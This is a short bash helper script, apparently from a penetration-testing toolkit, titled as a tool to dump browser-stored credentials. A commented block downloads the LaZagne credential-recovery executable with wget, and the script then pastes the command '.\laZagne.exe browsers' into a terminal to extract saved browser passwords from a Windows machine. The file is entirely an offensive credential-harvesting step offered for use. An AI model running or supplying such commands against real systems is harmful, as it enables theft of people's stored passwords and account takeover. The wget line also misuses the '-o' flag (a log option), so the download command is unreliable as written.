#!/bin/bash

"""
Dump browser stored credentials
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

: ' 
https://github.com/AlessandroZ/LaZagne
mkdir /opt/windows && wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe -o /opt/windows/LaZagne.exe
'

paste_command ".\laZagne.exe browsers"
